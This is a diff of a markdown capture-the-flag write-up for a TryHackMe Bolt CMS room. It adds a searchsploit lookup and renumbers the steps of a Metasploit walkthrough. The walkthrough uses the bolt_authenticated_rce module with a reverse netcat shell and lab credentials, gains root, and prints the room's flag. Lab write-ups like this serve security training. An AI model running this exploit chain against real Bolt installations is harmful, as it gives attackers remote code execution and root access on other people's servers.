@@ -225,7 +225,25 @@ DOWNLOADED: 4612 - FOUND: 5
 # Vulnerability Identification
 > Vulnerability Identification Using Metasploit
 14. `msfconsole`
-15. `search Bolt 3.7`
+15. `searchsploit Bolt 3.7`
+```bash
+msf6 > searchsploit Bolt 3.7
+[*] exec: searchsploit Bolt 3.7
+
+[i] Found (#2): /opt/searchsploit/files_exploits.csv
+[i] To remove this message, please edit "/opt/searchsploit/.searchsploit_rc" for "files_exploits.csv" (package_array: exploitdb)
+
+[i] Found (#2): /opt/searchsploit/files_shellcodes.csv
+[i] To remove this message, please edit "/opt/searchsploit/.searchsploit_rc" for "files_shellcodes.csv" (package_array: exploitdb)
+
+---------------------------------------------- ---------------------------------
+ Exploit Title                                |  Path
+---------------------------------------------- ---------------------------------
+Bolt CMS 3.7.0 - Authenticated Remote Code Ex | php/webapps/48296.py
+---------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+16. `search Bolt 3.7`
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ msfconsole 
@@ -280,8 +298,8 @@ msf6 >
 
 # Vulnerability Exploitation
 > Vulnerability Exploitation Using Metasploit
-16. `use {EXPLOIT PATH}`
-17. `show options`
+17. `use {EXPLOIT PATH}`
+18. `show options`
 ```bash
 msf6 > use exploit/unix/webapp/bolt_authenticated_rce
 [*] Using configured payload cmd/unix/reverse_netcat
@@ -336,13 +354,13 @@ View the full module info with the info, or info -d command.
 
 msf6 exploit(unix/webapp/bolt_authenticated_rce) > 
 ```
-18. `set PASSWORD {JAKE'S PASSWORD}`
-19. `set RHOSTS {TARGET IP}`
-20. `set USERNAME {JAKE'S USERNAME}`
-21. `set LHOST {MACHINE IP}`
-22. `set LPORT {PORT NUMBER}`
-23. `show options`
-24. `exploit`
+19. `set PASSWORD {JAKE'S PASSWORD}`
+20. `set RHOSTS {TARGET IP}`
+21. `set USERNAME {JAKE'S USERNAME}`
+22. `set LHOST {MACHINE IP}`
+23. `set LPORT {PORT NUMBER}`
+24. `show options`
+25. `exploit`
 ```bash
 msf6 exploit(unix/webapp/bolt_authenticated_rce) > set PASSWORD boltadmin123
 PASSWORD => boltadmin123
@@ -428,9 +446,9 @@ msf6 exploit(unix/webapp/bolt_authenticated_rce) > exploit
 [+] Reverted user profile back to original state.
 
 ```
-25. `whoami`
-26. `find / -type f -name flag.txt 2>/dev/null`
-27. `cat {FLAG TEXT PATH}`
+26. `whoami`
+27. `find / -type f -name flag.txt 2>/dev/null`
+28. `cat {FLAG TEXT PATH}`
 ```bash
 whoami
 root
@@ -443,6 +461,13 @@ find / -type f -name flag.txt 2>/dev/null
 cat /home/flag.txt
 THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
 ```
+
+
+**Room completed!**
+
+![]()
+
+# Command History
 
 # Contributions
 This writeup was made by Jonmar Corpuz, founder of **KnowCybersecurity** (www.knowwwcybersecurity.com)
